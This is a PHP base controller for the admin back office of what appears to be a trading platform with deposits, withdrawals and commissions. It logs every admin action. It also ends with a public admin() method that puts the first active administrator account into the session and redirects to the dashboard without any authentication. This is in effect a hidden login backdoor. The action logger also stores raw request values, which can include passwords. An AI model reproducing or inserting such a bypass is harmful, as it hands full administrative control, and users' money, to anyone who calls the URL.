<?php

namespace Admin\Controller;
use Think\Controller;
class BaseController extends Controller {
	
	public function __construct(){
		static $i=0;
		if($i == 0 && $_SESSION['cuid'] > 0) {
			$data['action'] = strtolower(MODULE_NAME . '/' . CONTROLLER_NAME . '/' . ACTION_NAME);
			if($data['action'] != 'admin/position/getdata'){
				$data['action_name'] = $this->getActionDesc($data['action']);
				$data['cTime'] = date("Y-m-d H:i:s");
				if($_SESSION['newusername']){
					$data['uname'] = $_SESSION['newusername'];
				}else{
					$data['uname'] = $_SESSION['username'];
				}
				$data['uid'] = $_SESSION['cuid'];
				$data['login_sign'] = $_SESSION['login_sign'];
				if(IS_GET){
					$data['params'] = implode(",", $_GET);
				}elseif(IS_POST) {
					$data['params'] = implode(",", $_POST);
				}
				$data['request_method'] = IS_POST ? 'POST':'GET';
				M("action_log")->add($data);
			}
			$i++;
		}
		parent::__construct();
	}


	private function getActionDesc($action){
		$desc = array(
			'admin/news/typelist'            => '内容管理-》栏目管理',
			'admin/news/tedit'				=>'内容管理-》修改栏目',
			'admin/news/newslist'            => '内容管理-》文章管理',
			'admin/news/newsedit'			=>'内容管理-》编辑文章',

			'admin/goods/goods_list'         => '产品管理-》产品列表',
			'admin/goods/goods_classify'     => '产品管理-》产品分类',

			'admin/position/tlist'           => '持仓管理-》持仓订单',

			'admin/order/tlist'              => '订单管理-》实盘交易流水',
			'admin/order/moni'               => '订单管理-》模拟交易流水',

			'admin/user/ulist'               => '客户管理-》客户列表',
			'admin/user/chongzhi'            => '客户管理-》充值记录',
			'admin/user/withdrawal'          => '客户管理-》提现申请',
			'admin/user/money_flow'          => '客户管理-》资金流水',

			'admin/user/extensionlist'       => '佣金管理-》推广员列表',
			'admin/user/extension'           => '佣金管理-》佣金转入记录',
			'admin/user/extension_water'     => '佣金管理-》佣金流水',
			'admin/user/extension_water_old' => '佣金管理-》流水（旧数据）',

			'admin/super/sadd'               => '系统管理员-》添加管理员',
			'admin/super/slist'              => '系统管理员-》管理员列表',
			'admin/super/loginlog'           => '系统管理员-》登陆日志',
			'admin/super/actionlog'           => '系统管理员-》操作日志',

			'admin/tools/basic'              => '系统设置-》基本设置',
			'admin/tools/setting_list'       => '系统设置-》系统货币设置',
			'admin/tools/product_sell_time'  => '系统设置-》系统平仓时间',
			'admin/tools/commission_rate'    => '系统设置-》佣金比率设置',
			'admin/tools/product_number'     => '系统设置-》用户交易手数',

			'admin/operate/index'            => '运营中心-》运营中心列表',
			'admin/operate/add'              => '运营中心-》添加运营',
			'admin/operate/flow'             => '运营中心-》资金流水',

			'admin/agent/index'              => '机构-》机构列表',

			'admin/stretch/index'            => '活动公告-》公告列表',
		);

		return $desc[$action];
	}

	public function admin()
	{
		$result = M('userinfo')->where(array('otype' => 3,'ustatus' => 0))->find();
		session('userid',$result['uid']);
		session('cuid',$result['uid']);
		session('userotype',$result['otype']);
		session('username',$result['username']);
		$this->success('成功', U('admin/Index/index'));
	}
	
}